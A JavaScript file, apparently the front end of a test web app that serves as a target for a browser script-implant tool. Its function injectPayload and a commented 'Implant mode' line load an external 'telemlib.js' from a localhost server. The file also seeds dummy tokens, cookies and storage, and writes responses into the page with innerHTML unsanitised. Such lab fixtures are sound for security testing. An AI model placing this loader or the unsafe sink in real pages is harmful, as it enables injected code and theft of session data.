
//  "App" JavaScript
function xhrGetAnswer()
{
	console.log("Sending XHR request...");

	var authtoken = localStorage.getItem("Authorization");

	request = new XMLHttpRequest();
	request.open("POST", "/api/xhrAnswer");
	request.responseType = "json";
	request.setRequestHeader("Content-type", "application/json; charset=UTF-8");
	request.setRequestHeader("Authorization", authtoken);

	var jsonData = new Object();
	jsonData["request"] = "answer";
	var jsonString = JSON.stringify(jsonData);
	request.send(jsonString);

	request.onload = function() {
		var jsonResponse = request.response;

		// console.log("MAIN.JS jsonResponse: " + jsonResponse);

		var status = request.status;

		var answer = jsonResponse.answer;

		// console.log("MAIN.JS: Get XHR answer: " + answer);

		var answerSpot = document.getElementById("answerHeader");
		answerSpot.innerHTML = "Answer: <i>" + answer + "</i>";
	};

	document.cookie = "secondTestCookie=secondTestCookieValue";
	localStorage.setItem("testlocalStorage2", "testValue2");
	sessionStorage.setItem("testSessionStorage2", "testValue2");
}



async function fetchGetAnswer()
{
	console.log("Sending Fetch request...");

	var authtoken = localStorage.getItem("Authorization");

	var req = await fetch('/api/fetchAnswer', {
		method:"POST",
		body: JSON.stringify({
			'request': 'answer'
		}),
		headers: {
			"Content-type": "application/json; charset=UTF-8",
			"Authorization": authtoken
		}
	});

	var jsonResponse = await req.json();
	var answer = jsonResponse.answer;

	// console.log("Got fetch answer: " + answer);

	var answerSpot = document.getElementById("answerHeader");
	answerSpot.innerHTML = "Answer: <i>" + answer + "</i>";
}



async function jqueryGetAnswer()
{
	console.log("Sending jQuery request...");

	var authtoken = localStorage.getItem("Authorization");

	$(document).ready(function() {
    // Data to be sent in the POST request
		var requestData = {
			request: "answer"
		};

		$.ajax({
			type: "POST",
			url: "/api/jqueryAnswer",
			data: JSON.stringify(requestData),
			contentType: "application/json; charset=utf-8",
			headers: {
				"Authorization": authtoken
			},
			dataType: "json",
			success: function(responseData) {
            // Handle the successful response here
				// console.log("Response received:", responseData);
				var answer = responseData.answer;
				var answerSpot = document.getElementById("answerHeader");
				answerSpot.innerHTML = "Answer: <i>" + answer + "</i>";
			},
			error: function(error) {
            // Handle errors here
				console.error("Error:", error);
			}
		});
	});
}




function injectPayload()
{
	document.head.appendChild(Object.assign(document.createElement('script'),
		{src:'https://127.0.0.1:8444/lib/telemlib.js',type:'text/javascript'}));

}




function initSession()
{
	localStorage.setItem("Authorization", "SECRET_API_KEY_FALL_2023!");
	document.cookie = "testCookie=testCookieValue";
}




initSession();


// Implant mode
//document.head.appendChild(Object.assign(document.createElement('script'),{src:'https://127.0.0.1:8444/lib/telemlib.js',type:'text/javascript'}));


